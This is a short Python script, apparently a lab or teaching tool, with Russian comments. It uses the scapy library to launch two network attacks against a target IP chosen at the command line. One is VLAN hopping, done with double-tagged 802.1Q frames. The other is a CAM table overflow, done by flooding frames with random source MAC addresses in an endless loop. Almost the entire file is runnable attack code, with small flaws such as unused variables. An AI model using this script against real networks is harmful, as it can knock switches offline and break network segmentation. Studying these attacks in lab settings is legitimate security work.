#!/usr/bin/python

# Установка пакета:
# apt-get install python-scapy
#
# Модуль generation_p.py для генерации различных атак и трафика разного типа, в т.ч и L2
# исрользуется библиотека scapy, тесно интегрированная с python
# в этом варианте программы представленны только 2 вида атак:
#    VLAN Hooping
#    CAM Table Overflow
# 
# с помощью Scapy можно воспроизвести функции любой сетевой утилиты, начиная от 
# простейших ICMP-команд типа ping и traceroute и заканчивая реализациями сложных 
# алгоритмов поиска уязвимостей безопасности

from scapy.all import *
import sys

if len(sys.argv) != 3:
    print("Usage: ",sys.argv[0],"sudo python3 geheration_p.py 'protocol' 'target IP' ")
    sys.exit(1)
ipa=sys.argv[1]
iface=sys.argv[2]


typeAtack = sys.argv[1]
targetIP = sys.argv[2]



if typeAtack == '-vlan_hop':
    send(Dot1Q(vlan=1)/Dot1Q(vlan=2)/IP(dst=targetIP)/ICMP())
elif typeAtack == '-cam_tab':
    sendp(Ether(src=RandMAC())/IP(dst=targetIP)/ICMP(), loop=1)

 



